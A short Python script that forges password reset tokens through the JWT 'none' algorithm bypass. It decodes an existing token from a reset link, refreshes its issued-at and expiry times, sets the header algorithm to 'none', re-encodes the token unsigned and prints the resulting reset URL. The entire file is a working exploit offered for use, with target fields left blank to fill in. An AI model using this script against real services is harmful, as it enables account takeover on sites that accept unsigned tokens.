import base64
import json
import datetime
import jwt  # Ensure PyJWT is installed with: pip install PyJWT

#Base URL of the the password reset link
url = "" 

# Function to decode Base64URL
def decode_base64url(data):
    padding = '=' * (4 - len(data) % 4)  # Add necessary padding
    return base64.urlsafe_b64decode(data + padding)

# Original JWT (decoding the existing token), this is what comes after the base url, will contain things like email, name, etc; is in base64
token = ""
header, payload, _ = token.split('.')
decoded_header = json.loads(decode_base64url(header).decode())
decoded_payload = json.loads(decode_base64url(payload).decode())

# Print original header and payload
print("Decoded Header:", decoded_header)
print("Decoded Payload:", decoded_payload)

# Update payload with current timestamp
current_time = int(datetime.datetime.now().timestamp())
expiration_time = current_time + 3600
decoded_payload["iat"] = current_time
decoded_payload["exp"] = expiration_time

# Modify the header to use "none" algorithm
decoded_header["alg"] = "none"

# Encode the token with the "none" algorithm
unsigned_token = jwt.encode(
    decoded_payload,  # Updated payload
    key="",  # Empty key for the "none" algorithm
    algorithm="none",  # Explicitly use "none" algorithm
    headers=decoded_header  # Updated header with "none" algorithm
)

print("Unsigned Token (valid with 'none' algorithm):", unsigned_token)
print(url + unsigned_token)
